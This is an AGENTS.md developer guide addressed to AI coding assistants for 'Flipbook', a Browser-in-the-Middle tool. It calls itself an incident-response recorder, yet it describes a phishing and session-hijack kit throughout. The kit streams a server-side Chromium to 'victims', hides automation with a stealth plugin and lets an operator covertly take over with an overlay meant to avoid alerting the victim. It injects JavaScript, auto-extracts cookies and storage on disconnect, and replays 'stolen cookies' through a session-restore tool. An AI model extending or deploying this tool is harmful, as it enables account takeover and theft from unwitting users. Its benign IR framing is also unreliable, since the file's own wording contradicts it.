# AGENTS.md — Flipbook

This file is for AI assistants (Claude, GPT, Gemini, etc.) working on this project. Read it fully before making changes.

---

## What this is

Flipbook is a **Browser-in-the-Middle (BitM) session recording tool** used by professional sysadmins for IR. A headless Chromium browser runs server-side, the user sees a real-time canvas stream of it, and their mouse/keyboard input is forwarded to the browser. The operator (admin) can monitor sessions, and take over the browser in real time to prevent loss.

This is a TypeScript rewrite of the original Flipbook (Node.js/Puppeteer/WebRTC). The core architectural change:
- **Old:** XVFB → Chromium → `getDisplayMedia()` → WebRTC → user `<video>`
- **New:** Playwright headless Chromium → CDP `Page.startScreencast` → Socket.IO binary → user `<canvas>`

---

## Tech stack

| Layer | Technology |
|---|---|
| Runtime | Node.js 22, ESM (`"type": "module"`) |
| Language | TypeScript, `NodeNext` module resolution |
| Server | Fastify v5 + `@fastify/socket.io` + `@fastify/static` |
| Browser | `playwright-extra` + `puppeteer-extra-plugin-stealth` |
| Config validation | `zod` |
| CLI tools | `@inquirer/prompts` |
| Dev runner | `tsx` |
| Build | `tsc` → `dist/` |

---

## Architecture overview

```
Victim browser
  └─ canvas + socket.io client (victim.html)
       │  [WebSocket, binary frames]
       ▼
Fastify/Socket.IO server (server.ts)
  ├─ socket-handlers.ts  — event routing, auth, input dispatch
  ├─ browser-manager.ts  — pre-warm pool of Chromium instances
  │    └─ screencast.ts  — CDP Page.startScreencast loop
  ├─ input-handler.ts    — mouse/keyboard → Playwright API
  └─ session-extractor.ts — cookies/storage via CDP

Admin browser
  └─ admin.html — victim list, takeover canvas, data display
```

### Pre-warm pool

One "warm" browser always sits idle on `about:blank`. When a victim connects:
1. Grab `warmInstance`, set it to `null`
2. Immediately fire `createWarmBrowser()` in background (no await)
3. Configure and navigate claimed instance to target URL
4. Wire up `onFrame` callback to emit to victim socket

This gives near-instant response to the victim with no cold-start lag.

### Frame routing — the `onFrame` callback

`BrowserInstance.onFrame` is a **mutable function field**. Normal mode:
```typescript
instance.onFrame = (buf) => io.to(victimSocket).emit('frame', buf);
```
During admin takeover, swap it without restarting the screencast:
```typescript
instance.onFrame = (buf) => {
  io.to(victimSocket).emit('frame', buf);
  adminSocket.emit('frame', buf);
};
```
Revert on `give_back_control`. No CDP restart needed.

---

## Critical implementation details

### 1. CDP screencast requires frame acks

Chromium **stops sending frames after ~3 seconds** if you don't ack each one:
```typescript
session.send('Page.screencastFrameAck', { sessionId }).catch(() => {});
```
This is handled in `screencast.ts`. Do not remove it.

### 2. Screencast stops on navigation

CDP screencast is tied to the document. When the main frame navigates, the screencast stops. The fix in `screencast.ts`:
```typescript
page.on('framenavigated', (frame) => {
  if (frame.parentFrame() !== null) return; // ignore iframes
  void stopCurrentSession().then(() => startSession());
});
```
This restarts the CDP session after every top-level navigation.

### 3. Coordinate scaling

The victim's viewport ≠ the Playwright viewport. Scale factors are computed at claim time:
```typescript
instance.scaleX = target.width / victimWidth;
instance.scaleY = target.height / victimHeight;
```
All mouse coordinates must be multiplied by these before Playwright calls. This is handled in `input-handler.ts`. Do not pass raw victim coordinates to Playwright.

### 4. Binary transport

Socket.IO **must use `transports: ['websocket']` only** — polling transport corrupts binary frame data. Set on both server and client.

### 5. CDP session lifecycle

CDP sessions detach when the browser context navigates or closes. Always wrap `cdpSession.send()` in try/catch. Get a fresh CDP session after each navigation (see `startSession()` in `screencast.ts`).

### 6. JSON imports

Use `assert { type: 'json' }` syntax — requires Node 22 + `NodeNext` module resolution. Already configured in `tsconfig.json`.

### 7. `import.meta.dirname`

Available in Node 22+. If you need to support older Node, use:
```typescript
import { fileURLToPath } from 'url';
import { dirname } from 'path';
const __dirname = dirname(fileURLToPath(import.meta.url));
```
Both patterns are used in the codebase.

---

## Input authorization rules

Input events can come from victim OR admin sockets. The rules:

```
Victim input:   blocked when instance.controllerSocket is set (admin has taken over)
Admin input:    only processed when instance.controllerSocket === socket.id
Unknown socket: always ignored
```

Admin-only commands (`take_over_browser`, `get_cookies`, `navigate`, `inject_js`) check `socket.data.isAdmin` set by Socket.IO middleware in `server.ts`.

---

## Takeover mechanism deep dive

### Architecture

Takeover is implemented via **mutable frame routing** + **server-side input blocking**:

```typescript
// Normal mode (victim only)
instance.onFrame = (buf) => io.to(victimSocket).emit('frame', buf);

// Takeover mode (admin only receives frames)
instance.onFrame = (buf) => {
  io.to(victimSocket).emit('frame', buf);  // victim receives frames but ignores them (frozen)
  adminSocket.emit('frame', buf);          // admin sees real-time frames
};

// Input blocking (server-side)
if (instance.controllerSocket) return;  // victim input ignored

// Client-side freeze (victim.html)
if (isTakenOver) return;  // victim ignores new frames, shows frozen last frame
```

### Key behaviors

1. **Victim socket stays open** — WebSocket connection is NOT closed during takeover
2. **Frame routing is swapped** — `onFrame` callback is reassigned (no CDP restart needed)
3. **Input blocking is server-side** — victim events reach server but are ignored via `controllerSocket` check
4. **Control is reversible** — admin can give back control multiple times in a session
5. **Overlay is optional** — `victim.html` shows "Please wait..." but can be disabled for stealth

### Takeover flow

**Take over:**
1. Admin clicks "Take Over" → confirmation modal appears
2. Admin confirms → `take_over_browser` event sent
3. Server sets `instance.controllerSocket = adminSocket.id`
4. Server swaps `onFrame` to emit to BOTH victim and admin
5. Server emits `taken_over` to victim (triggers overlay)
6. Admin receives frames and can send input

**Give back:**
1. Admin clicks "Give Back" → `give_back_control` event sent
2. Server clears `instance.controllerSocket = null`
3. Server restores `onFrame` to victim-only
4. Server emits `control_returned` to victim (removes overlay)
5. Victim input is unblocked

### Common misconceptions

❌ **"Takeover closes the victim's socket"** — FALSE. Socket stays open, only input is blocked.

❌ **"You can't give back control"** — FALSE. Control is fully reversible via `give_back_control`.

❌ **"CDP session restarts during takeover"** — FALSE. Only `onFrame` callback is swapped, no CDP restart.

❌ **"Victim sees nothing during takeover"** — FALSE. Victim still receives frames (sees browser state).

### Limitations & considerations

1. **Stealth overlay** — Victim sees frozen last frame + subtle "Processing..." spinner during takeover. Looks like normal site loading behavior, much less alarming than previous "Please wait..." message.

2. **Performance impact** — Frames still sent to victim socket but ignored client-side. Admin receives full frame stream. Minimal bandwidth overhead.

3. **"Stunt hacking" use case** — Best for demo finales or critical interventions, not continuous control. High wow factor with low victim alerting.

4. **Freeze duration** — Long takeovers (>30 seconds) may cause victim to refresh or close tab. Keep takeovers brief for best results.

5. **Admin disconnect handling** — If admin disconnects during takeover, `handleDisconnect()` automatically returns control to victim and unfreezes their view.

6. **Multiple admins** — Only ONE admin can control at a time (enforced by `controllerSocket` check). First admin to take over wins.

### Testing takeover

To verify socket behavior:

```bash
# Terminal 1: Start server
npm start

# Terminal 2: Open victim page
# Visit http://localhost:3000/ in browser

# Terminal 3: Open admin panel
# Visit http://localhost:3000/admin in browser

# Test sequence:
# 1. Take over → verify victim still sees frames
# 2. Admin sends input → verify it works
# 3. Give back → verify victim input works again
# 4. Repeat steps 1-3 → verify multiple takeovers work
```

### Debugging takeover issues

**Victim input not blocked:**
- Check `instance.controllerSocket` is set in `socket-handlers.ts`
- Verify victim event handlers check `if (instance.controllerSocket) return;`

**Admin not receiving frames:**
- Check `onFrame` callback includes `adminSocket.emit('frame', buf);`
- Verify admin socket is connected (check `socket.id` matches `instance.controllerSocket`)

**Can't give back control:**
- Check `give_back_control` handler clears `instance.controllerSocket = null`
- Verify `control_returned` event is emitted to victim socket
- Check victim overlay removal logic in `victim.html`

**Overlay doesn't appear/disappear:**
- Check `taken_over` and `control_returned` events are emitted
- Verify victim.html event handlers (lines 121-128)
- Check overlay CSS (lines 14-22) and JavaScript logic

---

## File map

| File | Responsibility |
|---|---|
| `src/types.ts` | All shared interfaces. Socket.IO event maps. Import from here, not inline. |
| `src/server.ts` | Fastify init, routes, Socket.IO auth middleware, startup sequencing |
| `src/browser-manager.ts` | Pre-warm pool, claim lifecycle, browser instance Map |
| `src/screencast.ts` | CDP screencast start/stop/restart, frame ack, thumbnail emission |
| `src/input-handler.ts` | Mouse/keyboard/paste → Playwright, coordinate scaling, key normalization |
| `src/session-extractor.ts` | `Network.getAllCookies` via CDP, localStorage/sessionStorage via `page.evaluate` |
| `src/socket-handlers.ts` | All Socket.IO event registrations for both victim and admin sockets |
| `public/victim.html` | Canvas + socket.io client. Uses `createImageBitmap()` for off-thread JPEG decode |
| `public/admin.html` | Vanilla JS (no jQuery). Bootstrap dark theme. Blob URL revocation for thumbnails. |
| `tools/add-target.ts` | `@inquirer/prompts` interactive CLI — writes to `targets.json` |
| `tools/session-restore.ts` | Loads stolen cookies/storage, opens headed Playwright browser |

---

## What NOT to do

- **Do not use `page._client`** — this was removed in Puppeteer v14+ and is why this rewrite exists. Use `page.context().newCDPSession(page)` instead.
- **Do not use WebRTC or `getDisplayMedia()`** — no XVFB available; headless Chromium can't capture its own display.
- **Do not add polling transport** — binary corruption, see above.
- **Do not await the `onFrame` callback** — Socket.IO emit is synchronous; awaiting would add unnecessary latency.
- **Do not use a single CDPSession across navigations** — get a fresh session after each `framenavigated` event.
- **Do not add jQuery** — admin.html is intentionally vanilla JS.

---

## Common tasks

### Add a new Socket.IO event

1. Add the event signature to `ClientToServerEvents` or `ServerToClientEvents` in `src/types.ts`
2. Register the handler in `src/socket-handlers.ts`
3. TypeScript will enforce the payload shape end-to-end

### Add a new config field

1. Add to the `Config` interface in `src/types.ts`
2. Add to the `ConfigSchema` zod schema in `src/server.ts`
3. Pass through `initBrowserManager()` if browser-manager needs it

### Adjust screencast quality/FPS

Edit constants at top of `src/screencast.ts`:
```typescript
export const SCREENCAST_QUALITY = 80;     // JPEG quality 0-100
export const SCREENCAST_FPS = 30;         // target FPS (informational — CDP controls actual rate)
export const THUMBNAIL_EVERY_N_FRAMES = 5; // how often admin thumbnails update
```

### Run without building

```bash
npm run dev        # starts server.ts via tsx
npm run add-target # runs tools/add-target.ts via tsx
```

### Build and verify

```bash
npm run build   # tsc — should produce zero errors
```

---

## Known edge cases

- **First victim before warm-up completes:** `claimInstance()` falls back to `createAndClaimCold()` — slightly slower but functional.
- **Admin disconnects during takeover:** `handleDisconnect()` in `socket-handlers.ts` restores `onFrame` to victim-only and emits `control_returned`.
- **CDP session detaches mid-screencast:** `startScreencast()` wraps CDP calls in try/catch and exits gracefully. The `framenavigated` handler will restart it.
- **Victim disconnects:** `closeBrowser()` detaches CDP session then closes the Playwright context. Admin is notified via `victim_disconnected`. **Auto-extraction:** Before closing, cookies and storage are automatically extracted and sent to all admins, ensuring no session data is lost even if victim closes browser unexpectedly.

---

## Build / deploy

```bash
npm install
npx playwright install chromium --with-deps
npm run build
npm start
```

Docker:
```bash
docker build -t flipbook .
docker run -d -p 3000:3000 flipbook
```

Environment variables: `PORT` (default 3000), `HOST` (default 0.0.0.0).
